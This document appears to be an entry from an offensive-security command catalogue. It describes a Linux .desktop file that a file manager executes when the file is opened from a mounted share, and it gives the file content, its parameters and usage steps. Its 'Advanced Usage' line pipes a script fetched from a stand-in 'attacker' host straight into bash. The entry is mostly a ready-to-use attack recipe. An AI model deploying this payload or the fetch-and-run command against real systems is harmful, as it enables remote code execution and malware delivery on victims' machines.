---
id: cmd-3
data: |-
  [Desktop Entry]
  Exec=xmessage "Arbitrary RCE :)"
  Type=Application
tags:
  - rce
  - desktop-file
type: command
output: 'Runs xmessage displaying ''Arbitrary RCE :)'' or any substituted command'
executor: file
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.881Z'
verified: false
validated: true
submitted: true
---
# desktop-file-rce

## Command

Content for a .desktop file, executed by the file manager after mounting.

```ini
[Desktop Entry]
Exec=xmessage "Arbitrary RCE :)"
Type=Application
```

## Description

Defines an executable desktop entry that runs an arbitrary command when opened, exploiting Linux's auto-execution of .desktop files from mounted shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Exec | Command to execute (e.g., xmessage "Arbitrary RCE :)") | Yes |
| Type | Specifies as Application for execution | Yes |

## Examples

### Basic Usage

Save as example.desktop with executable permissions (chmod +x).

### Advanced Usage

Exec=gnome-terminal -- bash -c 'curl http://attacker/payload.sh | bash'

## Expected Output

The specified command runs in the user's session (e.g., dialog box appears).

## Related

- [[Related Procedure: Exploit-OS-Handler-for-Arbitrary-Code-Execution]]
